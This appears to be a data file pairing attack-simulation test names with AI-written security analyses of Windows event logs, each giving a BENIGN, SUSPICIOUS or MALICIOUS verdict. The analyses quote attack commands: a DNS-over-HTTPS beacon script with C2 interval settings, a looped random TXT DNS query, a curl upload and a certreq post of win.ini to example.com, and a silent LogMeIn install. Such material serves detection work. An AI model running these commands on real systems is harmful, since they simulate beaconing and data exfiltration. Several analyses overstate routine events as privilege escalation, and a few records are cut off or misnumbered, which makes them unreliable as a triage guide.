   - **Sysmon Logs** confirm the execution of `RemotePC.exe`, `RemotePCLauncher.exe`, and related executables from similar temporary or unexpected directories. The frequent installation and uninstallation activities observed close together might indicate an exploitation attempt or suspicious script.

2. **Installation of Services**:
   - The System log records the creation of a service named ""RPCService"" related to the RemotePC software installed as an auto-start service (`EventID 7045`), using ""LocalSystem"" as the account name. Unusual setup of services, especially using the LocalSystem account, can be a sign of privilege escalation attempts.

3. **Command Usage**:
   - Execution of commands via PowerShell, including `Start-Process`, with paths pointing to temporary files and consistent utilization of command-line arguments like `/NORESTART` suggest scripted or automated installation and execution sequences that are not typical for standard operations.

4. **Multiple Related Executions**:
   - A rapid succession of related RemotePC process executions, including uninstallers and launchers, seen in the Sysmon and Application logs, can suggest either legitimate installation issues being resolved or potentially malicious scripts attempting multiple persistence methods.

5. **Security Log Entrances**:
   - Security logs show multiple Service Control Manager operations and logons with elevated privileges (`EventID 4672`), although originating from legitimate processes, their timestamps closely align with the suspicious activities surrounding RemotePC.

### Assessment and Conclusion:
The frequency and manner in which the RemotePC software and its associated components are being executed, installed, and uninstalled suggest patterns potentially aligning with unauthorized remote access tools being quietly set up or cycled to avoid detection.

### Resolution:
**SUSPICIOUS**: The log activities around the RemotePC software exhibit enough indicators that merit further investigation to confirm whether these are legitimate actions by authorized personnel or part of unauthorized installations or activities.

### Guidance:
1. **Immediate Actions**:
   - Verify with relevant personnel if the sequence of events aligns with authorized software updates or installations.
   - Conduct a system integrity check and scan for potential malware signatures related to RemotePC.
   
2. **Monitoring and Investigation**:
   - Enable or enhance logging and monitoring for RemotePC-related activities for early detection and trace back any suspicious command executions.
   - Investigate the origin and destination of any network traffic associated with RemotePC to determine if unauthorized access may have occurred.

   - Review and restrict execution and write permissions in temporary directories.
   - Implement stricter policies on the installation of software and creation of services, especially those that utilize elevated privileges and system accounts."
Testing usage of uncommonly used port with PowerShell,"Upon a thorough review of the provided Windows event logs across different channels (Security, Application, Windows PowerShell, System, and Sysmon), the following points stand out:

### Security Log Observations:
1. **Event IDs 4624 (Logon) and 4672 (Special privileges assigned):**
   - The majority of logon events pertain to the SYSTEM user (NT AUTHORITY\SYSTEM), which is usual for service accounts and administrative actions on a server.
   - Logon Type 5 indicates a service start, which is common for server processes.
   - Privileges listed under Event ID 4672 are high-level privileges typically associated with system or administrative tasks. These privileges are not unexpected but warrant careful log correlation to understand context.

2. **Event ID 4798 (User's local group enumeration):**
   - Several accounts, including ""Administrator"", ""Guest"", ""DefaultAccount"", and ""admin_test"", undergo local group enumeration using ""taskhostw.exe"", which typically hosts Windows system services. This in isolation isn't immediately suspicious, but repetitive enumeration implies potential reconnaissance or automated tasks.

3. **Event ID 5379 (Credential Manager operations):**
   - Failed attempts to access credentials via credential manager events repeatedly show a return code indicative of failure. This could be benign if related to service startup attempts that rely on unavailable cached credentials or could indicate improper access attempts.

### Windows PowerShell Log Observation:
- A PowerShell command attempts to test network connectivity to `google.com:8081`. The activity by itself is not malicious but needs to be contextualized:
  - When did this occur, and is it part of standard scripts or monitoring?
  - Verify if it's initiated by authorized personnel or automated scripts.

### Sysmon Log Observations:
1. **Process creations (Event ID 1) and Image Loads (Event ID 5):**
   - Several processes such as `wevtutil.exe`, `whoami.exe`, and PowerShell instances are run by `admin_test`.
   - Common system utility executables like `wevtutil.exe`, typically used for event log management, appearing frequently could indicate log-checking or potentially log-clearing activity.
   - The launch of `HOSTNAME.EXE` and `whoami.exe` under `admin_test` context can indicate an account verification process, often a component of enumeration or malicious activity if unauthorized.

2. **Network related activities via `CompatTelRunner.exe`:**
   - This utility is part of Windows telemetry, and seeing it run alongside others like `UsoClient.exe` suggests routine system behaviors.
   - However, the frequency and sequence might signal script-based telemetry data gathering under justifying roles.

### Application and System Log Observations:
- **Routine System Activities:**
  - Time services, setup services, and defender updates are logged, supporting standard system operations with no immediate indicators of compromise.

### Conclusion:
Based on the logs, several activities suggest investigation. Specifically, the repeated enumeration of user groups, credential manager operation failures, and repeated execution of certain utilities under user contexts which would usually not be suspicious but are frequent enough to be noted. Additionally, the logs include network testing scripts running under PowerShell, which could be benign or indicative of testing unauthorized network access.

### Resolution: SUSPICIOUS
- **Rationale:** While explicit malicious activity is not confirmed, the number of group enumeration events, execution of specific system utilities, and failed credential operations warrant a more in-depth review to discount potential reconnaissance or misuse. The PowerShell connectivity test seems misplaced if unexplained within your context.

### Guidance:
1. **Correlate with other logs:** Determine if group enumeration or credential access failures connect to any known administrative task or recent configuration changes.
2. **Verify 'admin_test':** Confirm with the responsible parties that usage patterns align with expected activities.
3. **Monitor and Further Audit:**
   - Increase monitoring around the 'admin_test' user account and the utilization of PowerShell scripts.
   - Consider additional Sysmon or SIEM rules focused on deviations from typical administrative activities to catch unusual patterns."
UltraVNC Execution,"Upon analyzing the provided logs, several events appear to exhibit patterns that could be indicative of a security concern, but let's break down the highlights:

### Key Observations:

1. **Repeated Process Executions:**
   - Multiple instances of `conhost.exe`, `wevtutil.exe`, and `Netsh.exe` (specifically adding port openings for VNC) are appearing in quick succession. While `conhost.exe` is relatively benign, `netsh.exe` adding port openings (e.g., TCP 5900 for VNC) from command lines suggests potential configuration changes that may be opening network communication pathways for remote access.
   
2. **Usage of UltraVNC Tools:**
   - Processes like `C:\\Program Files\\uvnc bvba\\UltraVNC\\setpasswd.exe`, `setcad.exe`, and `vncviewer.exe` denote intensive use of UltraVNC-related activities. While UltraVNC is legitimate, without context or approval, it could signify unauthorized remote control software installation.
   
3. **PowerShell Execution:**
   - The execution of `powershell.exe` with commands to start VNC-related processes via `Start-Process` might be typical within administrative automation but could hint at potential automation for setup or remote access under adverse conditions if not appropriately controlled.
   
4. **Process Executions with Elevated Privileges:**
   - Several commands run under `High` integrity, including the `SearchProtocolHost.exe`, `SearchFilterHost.exe`, and the UltraVNC executables, which suggest operations carried out with administrative-level privileges.

5. **Firewall Configuration Changes using `netsh`:**
   - The invocation of `netsh` to create firewall exceptions indicates deliberate changes to network policies, possibly facilitating open ports for applications like UltraVNC - a red flag for intentions to control or monitor remotely.

6. **Security Log Event:**
   - Event 4798 captures a process querying mobile device membership for the Guest account, executed by `CompatTelRunner.exe`. This could trigger further investigation if it aligns with unauthorized information gathering.

### Assessment:
**Resolution: SUSPICIOUS**

The repetitive use of UltraVNC-related tools, PowerShell scripts, and firewall modifications suggest activities that align with potential remote access setup. Without proper validation or intended permissions, these could pose security risks. They warrant a deeper investigation to ensure they comply with the organization's policies and ensure there is no unauthorized access or configuration.

### Guidance:
- **Immediate Action:** Verify the legitimacy and approval of UltraVNC installations and their corresponding network permissions.
- **Network Monitoring:** Conduct a closer inspection of network traffic patterns for unusual access via newly configured ports.
- **Security Policy Review:** Re-examine security configurations and policies, especially around the use of remote access software and firewall settings.
- **Audit & Validate:** Review user account activities, especially for accounts executing these commands, to ensure compliance and rule out compromise or insider threats.

By examining these areas effectively, any security threats posed by the observed activities can be mitigated or resolved promptly."
Psiphon,"Upon analyzing the provided Windows event logs, several elements stand out which suggest potentially suspicious activity:

1. **PowerShell Usage**: There are multiple logs indicating the execution of a PowerShell command running a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src\Psiphon.bat`. Execution of scripts from temporary directories by PowerShell is often a method used in malicious activities, such as attempts to download or execute unauthorized software.

2. **Suspicious Executable**: The script `Psiphon.bat` could indicate a potential tunnel or proxy software, which may be used to obfuscate network traffic.

3. **Process Execution**: The `cmd.exe` is invoked with a command pointing to the same `Psiphon.bat` script. Usage of command-line utilities like CMD and PowerShell in coordination can be a red flag, potentially indicating scripting for lateral movement or data exfiltration.

4. **Unusual Logon Events**: There are several security log events (ID 4624) showing logons with type 3 (network logon), indicating access over the network, which can be normal for some services but requires verification of the originating IP addresses and process names.

5. **Usage of `whoami.exe` and `hostname.exe`**: These utilities provide information about the system and current user, which is sometimes used by attackers to gather the environment information post-compromise.

6. **Event Correlation and Privilege Use**: The presence of logs indicating privilege escalation (Event ID 4672) coinciding with the PowerShell script execution, which could imply that the script is attempting to use elevated permissions.

Given these points, the scenario should not be immediately deemed benign. However, aside from the `Psiphon.bat` detail, there is no direct confirmation of malicious payload execution.

**Resolution: SUSPICIOUS**

- **Assessment**: The event logs indicate suspicious activity, particularly around the execution of potentially unauthorized scripts and use of PowerShell from a temporary directory. The correlation between these actions and the elevated privileges seen in the logs warrants a closer investigation.

- **Recommendations**:
  - **Investigate origin**: Determine how the `Psiphon.bat` file was placed in the temp directory, and confirm if its presence is legitimate.
  - **Check with IT**: Validate the legitimacy of `admin_test` user actions, including verification with the user, if possible.
  - **Conduct a scan**: Use security tools to scan both the script file and the system for potential malware.
  - **Network traffic analysis**: Analyze outgoing network traffic for unusual activity or connections to unfamiliar IPs, which might indicate data exfiltration or external C2 communication.
  - **Monitor and audit**: Continue monitoring the system for further signs of suspicious activity.

This case warrants further investigation to ensure no compromise or unauthorized actions are being performed on the system."
svchost writing a file to a UNC path,"**Detailed Analysis of the Windows Logs:**

Upon close examination of the provided logs, several key events stand out. I will break down the analysis into notable areas of interest:

#### System Log:
- **Time Synchronization**: Multiple entries indicate a time change. This is reflected in the Kernel-General events (EventID: 1 and 24) and corroborated by the Microsoft-Windows-Time-Service event (EventID: 35). The time was adjusted backward by a couple of seconds, which might be due to NTP synchronization. This is typically normal behavior but should be noted in case it aligns with other suspicious activity. 
- **Normal Server Operations**: The logs mostly show routine operations typical for a server environment.

#### Security Log:
- **Successful Logons**: EventID 4624 shows a successful logon as SYSTEM using 'LogonType 5', which indicates a service startup using the credentials of the Local System account. This activity is generally benign unless correlated with unusual service activity.
- **Privileges**: EventID 4672 shows that SYSTEM user acquired multiple privileges (e.g., SeDebugPrivilege). While SYSTEM processes routinely have these privileges, it's always important to verify these activities align with known procedures and schedules.

#### Sysmon Log:
- **Command Line Execution via `cmd.exe`**: Examined command-line arguments related to `cmd.exe`. The command seems to query the MpCmdRun.exe, likely tied to Windows Defender checks, executed by a user `admin_test` with high integrity which could suggest admin tasks.
- **Multiple `wevtutil.exe` Operations**: The appearance of `wevtutil.exe`, a tool used to query and manage logs, suggests that logs might have been read or modified. This can be benign if performed by admins but could be suspicious if unplanned.
- **Edge Update Processes**: Numerous `MicrosoftEdgeUpdate.exe` processes are visible, managed under SYSTEM authority. This suggests routine updating of Microsoft Edge.

#### Application Log:
- **Windows Defender Usage**: Shows that Windows Defender is operational which supports potential security enforcement on the system.
- **Edge Update Activity**: Matches with the Sysmon logs, Edge update related log entries do not display anomalies beyond what would be expected from an update activity.

### Conclusion:
Based on the information provided, no definitive malicious behavior is evident from the logs. The events observed are consistent with regular maintenance, updates, and normal system operations. The `cmd.exe` usage for Defender seems legitimate, and the `wevtutil.exe` usage should be checked against administrative actions for validation.

### Final Resolution: **BENIGN**

### Guidance:
- Ensure that the time adjustments align with known NTP services or planned maintenance, especially if deviation from standard operation might occur.
- If there are any concerns surrounding the `wevtutil.exe` usage, consider auditing user accounts or reviewing administrative tasks to make sure this is intended.
- Regularly ensure all software, especially security tools, is up-to-date to reduce vulnerabilities.
- Maintain vigilance in monitoring logs for unusual patterns over time to detect potential threats early."
DNS over HTTPS Regular Beaconing,"### Analysis of Windows Event Logs

Upon analyzing the provided Windows event logs, several key points suggest suspicious and potentially malicious activity. Let's break down the findings from each log type:

#### Application Log
- The log primarily shows an entry from the Software Protection Platform Service with no evident malicious activity. 

#### Sysmon Log
- Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test` are noted, which is unusual unless administrative tasks such as event log maintenance or viewing are being performed.
- Execution of `whoami.exe` and `hostname.exe`, while legitimate, could be part of profiling commands an attacker uses to gather information about the system and its users if contextually strange.
- `powershell.exe` execution with a complex command:
  ```powershell
  & {Set-Location \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\"" .\\data\\src\\data-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain file -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30}
  ```
  This command line is highly suspicious as it shows a PowerShell script execution for domain and DNS operations that appear to be a form of communication potentially indicating a C2 (Command and Control) setup or data exfiltration mechanism.

#### Security Log
- Privilege escalation by the user `admin_test` is observed with the `SeDebugPrivilege`, which allows bypassing access restrictions, often used by attackers to escalate privileges further and dump credentials or run malicious operations.
- Multiple logon and special privileges assignment events are noted for `admin_test`, suggesting abnormal behavior and potential unauthorized access.

#### Windows PowerShell Log
- Mirror the Sysmon log PowerShell command execution with the same parameters, confirming the suspicious PowerShell activity. This further reinforces the likelihood of a malicious script being executed on the system.

#### System Log
- Contains time change events, which are unusual. Time change could be legitimate but can also be indicative of an attacker attempting to manipulate log timestamps or evade detection through timeline tampering.

### Conclusion
The behavior and patterns exhibited in these logs, particularly the execution of scripted PowerShell operations with parameters associated with DNS exfiltration and command and control operations, privileges modification, and potentially unauthorized session activities, strongly suggest suspicious and likely malicious activity.

### Final Assessment
**Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Action:**
   - Isolate the host `Server002` from the network to prevent further potential exfiltration or lateral movement by the adversary.
2. **Detailed Investigation:**
   - Analyze the 'data-doh-beacon.ps1' script if it can be retrieved from the system to understand its full intent and mechanism.
3. **Remediation:**
   - Reset credentials and review user access privileges, especially for `admin_test`.
   - Patch system vulnerabilities and review all systems for similar compromise indicators.
4. **Monitoring and Prevention:**
   - Implement enhanced monitoring and anomaly detection rules focusing on privileged access, scripted activities, and change of time settings.
   - Conduct a forensic analysis to determine the extent of the compromise and origins of unauthorized activities.
5. **Reporting:**
   - Document all findings and actions taken, report to relevant internal and external stakeholders, including cybersecurity response teams or law enforcement if necessary."
certreq download,"Upon reviewing the provided logs, I have identified a few points of interest that warrant further consideration for potential malicious activity:

### Anomalies Observed:

1. **Frequent Execution of System Utilities:**
   - The logs show repeated execution of typical Windows system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. While the execution of these utilities can be normal in a system admin context, the frequency and manner of execution in such a short span of time might be indicative of reconnaissance activities.

2. **Usage of Networking Tools:**
   - There's an instance where `cmd.exe` is used to execute `certreq.exe` with command-line arguments that include a URL (`https://example.com`), referencing `c:\\windows\\win.ini` and outputting to a temp file. `certreq` is commonly used for certificate related operations. This is irregular in routine operations and could signify an attempt to exfiltrate data or communicate with an external server.

3. **High Integrity Level Execution:**
   - The processes related to user `SERVER002\admin_test` were executed with high integrity level, suggesting possible usage of elevated privileges which is often an indicator of privilege escalation activities.

4. **Frequent Microsoft Edge Update Activities:**
   - There is a significant number of events regarding Microsoft Edge update processes executing (`MicrosoftEdgeUpdate.exe`, `setup.exe`, etc.). While this could be legitimate software updates, the sheer volume and diversity of updates/installers occurring almost simultaneously suggest that more scrutiny is needed to ensure these are authentic and not masquerading malicious payloads.

5. **Security Privileges:**
   - The `admin_test` user account possesses several high-level security privileges such as `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`, which if compromised, could be leveraged by an attacker to perform administrative tasks without detection.

### Conclusion:

While the logs do not provide a blatant indication of malicious activity, they do portray a suspicious pattern that aligns with common tactics used during the reconnaissance and lateral movement phases of a cyber attack. Here are my findings:

- **Resolution:** SUSPICIOUS

### Guidance and Next Steps:

1. **Investigate the `admin_test` Account Activity:**
   - Verify the legitimacy of the account `SERVER002\admin_test` and its recent activity. Check for unusual access patterns, especially given the privileges granted to this account.

2. **Review Network Access:**
   - Analyze network traffic to and from the example.com URL referenced in the `cmd.exe` execution with `certreq.exe` to understand the purpose of this communication and detect any unauthorized data exfiltration.

3. **Validate Edge Update Processes:**
   - Ensure that all Microsoft Edge update processes are legitimate and verify their authenticity through digital signatures. 

4. **Review System for Compromise Indicators:**
   - Conduct a comprehensive search for any additional indicators of compromise on the system including unauthorized changes, unexpected persistence mechanisms, or signs of lateral movements.

5. **Consider Further Monitoring:**
   - Increase monitoring on the system and related user accounts for any further signs of suspicious activity.

6. **Consider engaging Incident Response Team:**
   - If further investigation reveals more definitive signs of an intrusion, engage the incident response team to contain, eradicate and recover from a potential compromise.

This situation necessitates prudent and careful follow-up to verify the authenticity and intent behind the activities noted."
Windows - BITSAdmin BITS Download,"Upon reviewing the provided logs, I have highlighted some notable events and actions that appear potentially suspicious within the context of typical Windows operations.

### Anomalous Events and Analysis:

1. **Time Change Events (Security and System Logs, EventID 4616 & 1):**
   - There are frequent time change events logged within a short interval (from ""2024-10-24 11:21:06.6018691"" to ""2024-10-24 11:21:26.7907227"").
   - Time changes could indicate an attempt to manipulate time-related auditing information or to desynchronize system functions.

2. **Command Execution with Bitsadmin (Sysmon EventID 1):**
   - The use of `bitsadmin.exe` to download from a URL (`https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt`) stands out as potentially suspicious.
   - Although `bitsadmin.exe` is a legitimate tool, it is sometimes abused by attackers to download files because it can bypass some network level blocks.

3. **Multiple Process Executions (Sysmon Log, EventID 1 & 5):**
   - There is a high volume of sequential process executions: `whoami.exe`, `hostname.exe`, and `cmd.exe` invoking `bitsadmin.exe`.
   - These could be automated tasks but deserve further scrutiny to confirm their legitimacy and ensure they are authorized actions.

4. **Edge Update Process Stopped (Application Log):**
   - Two entries indicating the ""Service stopped"" for ""edgeupdate"" in quick succession.
   - This could be normal updating behavior, but it may also potentially interfere with legitimate browser updating functions, suggesting malware attempting to control browser updates.

### Assessment and Recommendation:

Based on the above observations, the log activities caught my attention, especially the use of `bitsadmin.exe`. Such usage is generally uncommon in a routine setup and could be used to download malicious payloads or scripts. Moreover, the repetitive time changes and process executions mean that these actions deserve further analysis.

The resolution for the logs should be marked as **SUSPICIOUS**. While concrete malicious activity is not definitively observed, the patterns and events highlighted necessitate a deeper inspection to rule out any hostile intent or compromise.

### Guidance on How to Proceed:

- **Deeper Log Analysis:** Investigate surrounding logs to determine if similar events are occurring and their frequencies.
- **User Verification:** Verify the actions performed by `SERVER002\admin_test` and ensure they align with authorized activities.
- **Network Traffic Analysis:** Check network logs for outgoing connections matching the URL observed in `bitsadmin.exe` usage.
- **Endpoint Security Review:** Run a comprehensive malware and security scan on `Server002` for signs of compromise.
- **Monitor Time Changes:** Analyze why frequent time changes are happening and ensure synchronization issues are not exploitation attempts.

Further investigation is required to ascertain the legitimacy or potential threat these observed activities may represent."
MSP360 Connect Execution,"## Analysis of Windows Event Logs

### Suspicious or Anomalous Behavior

1. **PowerShell Activity**:
   - All PowerShell events show execution of `powershell.exe` with the command `{Start-Process $env:ProgramFiles\\Connect\\Connect.exe}`. The command starts another process and could potentially be leveraged within a script by an attacker for malicious purposes if `Connect.exe` is malicious.
   - This pattern is repeated consistently with different providers (Registry, Alias, Environment, FileSystem, Function, Variable), potentially indicative of automation or scripting utilizing various PowerShell providers.

2. **System Monitor (Sysmon) Events**:
   - A large number of Sysmon logs are associated with `powershell.exe` and `conhost.exe` run by the user `SERVER002\\admin_test`. While this can be typical in administrative environments, it's worth noting due to the PowerShell usage pattern.
   - Of particular interest is the frequent execution of `wevtutil.exe`, a tool used to manage Event logs, which may indicate log tampering attempts.
   - Control and usage of `whoami.exe` and `hostname.exe` could indicate privilege/status checks, possibly by an attacker or script.
   - Many processes under `MicrosoftEdgeUpdate` are executed by `NT AUTHORITY\\SYSTEM`, suggesting automated updates. These processes seem legitimate but deserve double-checking against known update schedules to rule out masquerading threats.

3. **Application Log**:
   - The `Microsoft-Windows-Security-SPP` entry doesn't raise concern, but it does not provide significant information relating to suspicious activity.
   - Events labeled as ""Service stopped"" from `edgeupdate` indicate a service stopping, which is logged twice within a few seconds, not inherently suspicious but should be reviewed for expected behavior.

### Indicators of Potential Malicious Activity

- **PowerShell Execution**: The generic starting of processes without clear indication of what `Connect.exe` does raises suspicion. If this isn't a known or expected operation by validated configuration management tools, it should be further investigated.

- **Sysmon Process Observations**: High reliance on native tools and frequent spawning of processes such as `wevtutil.exe`, coupled with the absence of direct user-driven initiations, may suggest automated or scripted activity which could be unauthorized if not part of routine administrative scripts.

### Recommendation

- **Resolution**: **SUSPICIOUS**
  - Current evidence does not definitively indicate malicious activity; however, the extensive use of PowerShell, especially launching another executable, and the frequent appearances of certain system tasks cannot be overlooked and suggest the need for further investigation into their legitimacy.
  
### Guidance on How to Proceed

- Conduct a deep dive into what `Connect.exe` is supposed to perform and whether its executions align with IT policies and expected activities.
- Review scheduled scripts and administrative tasks to identify if these actions are sanctioned.
- Correlate with known good baselines from similar servers to identify deviations.
- Cross-reference with other security products like endpoint protection logs and network firewall logs to surface any related alerts.
- Review user `admin_test` activity logs for unexpected actions or abnormal timings.
- Implement tighter monitoring, such as alerting on the specific PowerShell command line execution if it’s not part of recognized activity.
- Ensure the legitimacy of the `MicrosoftEdgeUpdate` processes by comparing them to an authorized activity list.

By carefully addressing these points, a more conclusive determination can be achieved."
Curl Upload File,"Based on the analysis of the provided log entries, several activities stand out that either need further context or appear to be suspicious in nature:

1. **PowerShell Execution**: 
   - The logs show that PowerShell was executed by the user `SERVER002\admin_test`. However, without command-line arguments or script block logging, it is challenging to assess if it was used for malicious purposes. Further investigation is needed to determine the context and commands executed.

2. **Extensive Use of `curl` Command**:
   - There are multiple instances where `curl.exe` is used to upload a file (`c:\temp\filetestfile.txt`) to `www.example.com`. This action raises concerns as it could indicate data exfiltration. This activity must be scrutinized further, including verifying if this is legitimate business usage or if the server was compromised to upload sensitive information.

3. **Unusual `cmd.exe` Activities**:
   - The `cmd.exe` process invoked `curl.exe` multiple times with various flags on a high-integrity level session by the same user, `SERVER002\\admin_test`. The simultaneous execution of these commands within a short timeframe suggests scripted or automated activity, potentially malicious.

4. **Repeated Process Spawn with Sysmon**:
   - Frequent spawning of system-level processes like `whoami.exe`, `hostname.exe`, and `cmd.exe`, especially from a high-integrity session, looks unusual. While these can be utilized legitimately, when seen alongside potentially malicious file uploads, they warrant further evaluation.

5. **Microsoft EdgeUpdate Process Activities**:
   - Multiple `MicrosoftEdgeUpdate.exe` related activities with the SYSTEM account appear legitimate but should be confirmed as part of regular update tasks and not manipulations disguising malicious action.

**Assessment**:
- **SUSPICIOUS** - The presence of multiple `curl` uploads demands further attention as it could indicate data exfiltration. Additionally, the PowerShell execution and unusual `cmd.exe` activities raise red flags. However, they do not conclusively indicate a known malicious pattern without further context or evidence.

**Recommendations for Further Investigation**:
1. **Verify File Transfer**: Confirm the nature and content of `filetestfile.txt` being uploaded via `curl`. Check if the file is sensitive or contains confidential information.
   
2. **PowerShell Logging**: Enable extended logging for PowerShell to include Script Block and Module logs to have full transparency of operations executed.
   
3. **Analyze Network Traffic**: Investigate network logs to identify any potential data exfiltration or unusual communication with external IP addresses.
   
4. **User Activity**: Conduct interviews or reviews of tasks performed by `SERVER002\\admin_test` to understand if these actions align with legitimate duties.

5. **Patch and Secure**: Ensure that all systems are up to date with security patches, and legitimate applications (like Edge Update) are behaving as expected.

By conducting these additional investigations, you can determine whether these activities are part of malicious actions or benign system processes."
Splashtop Streamer Execution,"After reviewing the Windows event logs provided, several points of potential concern arise which indicate that further investigation is warranted. Let’s analyze the logs and break down the key findings:

1. **Execution of PowerShell**: 
    - The execution of PowerShell with unusual command-line arguments is observed: `""powershell.exe"" & {Start-Process -FilePath \""C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRServer.exe\""}`. The use of embedded PowerShell scripts or commands can often be indicative of malicious activity, such as running scripts without user awareness.
    - The PowerShell logs confirm that a PowerShell session was initiated with a command that specifies starting a process; this could be potentially used for lateral movement or to execute malicious code.

2. **frequent utilization of wevtutil.exe**:
    - The utility `wevtutil.exe` is executed multiple times. This utility is commonly used for managing event logs, including the export of logs. The command `""C:\Windows\system32\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx` suggests the exporting of Sysmon logs to a temporary directory, which could indicate an attempt to gather and possibly exfiltrate log data, a tactic sometimes used by attackers to cover their tracks.

3. **High Integrity Level Activities**:
    - The processes are running at a High integrity level, which suggests that administrative privileges are being used. High privileges activities, especially matched with multiple PowerShell and wevtutil executions, are suspicious and could point towards privilege escalation attempts.

4. **Usage of utilities like whoami.exe**:
    - `whoami.exe` execution, typically used to display the current user, can suggest reconnaissance activity to gather more information about the environment and the permissions available to the attacker.

5. **Persistent User Context**:
    - All actions are conducted by the user `SERVER002\admin_test` – this consistency in user context should be verified. Is `admin_test` a legitimate, known user with a recognized behavioral pattern, or does this point to a compromised account?

### Conclusion:

- **Assessment**: The activity seems suspicious due to the unconventional use of PowerShell, regular utilization of utility commands like `wevtutil.exe` and `whoami.exe`, and the administrative privileges in use. While these events might not conclusively prove malicious intent without further context, they are strong indicators that warrant further investigation.

- **Threats/Risks Identified**: Potential for privilege escalation, data exfiltration attempts, and unauthorized processes execution.

- **Guidance on How to Proceed**:
  - Conduct a deeper analysis of the user `SERVER002\admin_test`. Verify if this behavior is consistent with their normal routine.
  - Check for recent changes to PowerShell execution policies or new scripts added to the system.
  - Investigate network traffic during these log times for any signs of unauthorized external communications.
  - Review system logs for any new user accounts or modifications to existing groups/policies during this timeframe.
  - Ensure all security patches and updates are applied to mitigate exploitation of any known vulnerabilities.

**Final Resolution**: **SUSPICIOUS** - The logs reflect unusual activities that are not inherently malicious but could indicate the presence of nefarious actions. More thorough examination is crucial before any definitive conclusions can be drawn about the malicious nature of these activities."
DNS Large Query Volume,"Upon analyzing the provided Windows event logs, here are the key observations:

### 1. Suspicious PowerShell Activity:
- The logs show the execution of PowerShell with the following command:
  ```powershell
  & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type ""TXT"" ""file-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io"" -QuickTimeout}}
  ```
- This command is indicative of a potential DNS Exfiltration or delay tactic where random TXT DNS queries are being resolved in a loop. Such behavior can be suspicious as it might be used to test for external connectivity or for triggering specific responses from malicious infrastructure.

### 2. Logon Events with Elevated Privileges:
- There are multiple logon events (Event ID 4624) for the user `SERVER002\admin_test` using NTLM authentication. The source IP for these logons is a Link-local IPv6 address, which can be typical in internal testing or potentially suspicious depending on the network context.
- The subject user `admin_test` has elevated privileges as indicated by the SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, and others being granted (Event ID 4672). This could be typical of an administrative account, but the combination with the suspicious PowerShell activity raises concern.

### 3. Edge Updates and System Interactions:
- Multiple logs indicate Microsoft Edge Update processes running, which generally correspond to legitimate software updates. Various components like MicrosoftEdgeUpdate.exe and setup.exe are seen executing with SYSTEM privileges.
- Without any indication of modification or abnormal behavior of these Edge Update processes, they appear consistent with normal update cycles.

### 4. Other System and Application Logs:
- The rest of the logs, such as system time adjustments and general service operations, seem routine and do not indicate malicious actions by themselves.

### Assessment and Guidance:

- **Resolution:** **SUSPICIOUS**

Given the PowerShell activity involving randomized DNS queries, combined with the elevated privileges of the user involved, there is cause for further investigation. This could be part of network reconnaissance or data exfiltration tactics. 

### Recommended Actions:
1. **Investigation:** 
   - Identify the origin and purpose of the PowerShell script. Check if this is part of any scheduled task or user-initiated script that aligns with organizational IT practices.
   - Examine any network traffic associated with the ""nip.io"" domain for abnormal patterns.

2. **User Account Verification:**
   - Confirm the intent of the `admin_test` account's actions during the logged period. Verify if these actions are in line with regular maintenance or development work.
   - Review the authentication methods and source IP address for any anomalies.

3. **Monitoring:**
   - Increase monitoring on the affected system and account for any further execution of similar PowerShell scripts.
   - Enable logging of DNS queries at the network perimeter to detect similar patterns across the organization.

LogMeIn Files Detected Test on Windows,"Upon analyzing the provided Windows event logs, several points stand out as potential indicators of suspicious and malicious activity:

1. **Time Change Events:**
   - Numerous EventID 4616 entries indicate time adjustments by the svchost.exe process. While time synchronization is routine, frequent changes could be indicative of attempts to cover tracks or alter log timestamps.

2. **Privilege Escalation:**
   - EventID 4672 involves the user `admin_test` being granted special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. These are powerful privileges and suspect if not part of regular administrative activities.

3. **Unauthorized Software Execution:**
   - There is a Windows PowerShell execution where `LogMeInIgnition.msi` is downloaded via an `Invoke-WebRequest` command and then executed. The script installs the LogMeIn software without clear authorization or context, which could be used for remote access or control.
   - The script uses the start-process command to execute the downloaded file in a quiet mode, typically used to suppress user prompts, which raises suspicions.

4. **Software Installation Updates:**
   - Application events and the Sysmon logs indicate that LogMeIn Ignition was installed and executed. The rapid succession from download to execution is often characteristic of unauthorized software installations.
   - Several EdgeUpdate-related entries in the logs (EventID 1 in Sysmon logs) show numerous installations and update processes related to Microsoft Edge, which could be expected behavior if updates are occurring.

5. **Suspicious Network Activity:**
   - There is evidence of a network connection from a workstation `DESKTOP-3HL5B2P` involving `admin_test` using NTLM authentication (LogonType 3 - Nework Logon). Given the sequence of events, this could be related to remote access.

6. **Sysmon Event Analysis:**
   - Detection of multiple processes starting such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe` under the `admin_test` account again raises red flags for potentially malicious reconnaissance or cleanup activity after executing unauthorized tasks.

Upon reviewing these logs, the combination of privilege usage, unauthorized software download and installation, and potentially unsanctioned PowerShell commands are indicators of potential malicious activity.

**Assessment and Resolution:**
- **Resolution: MALICIOUS**
  - The logs reflect unauthorized download and execution of software using PowerShell, along with privilege escalations that are typically associated with compromise scenarios. This indicates a high risk of potential compromise, and steps should be taken promptly to identify and mitigate any threats posed by the installed software and access privileges used.

2. Conduct a thorough forensic analysis to determine the extent of the intrusion, including examining any potential IOC (Indicators of Compromise) found within.
3. Review user `admin_test`'s activity, privileges, and authentication patterns to adjust and monitor accordingly.
4. Inform relevant security teams and stakeholders about suspicious activity to apply suitable protective measures.
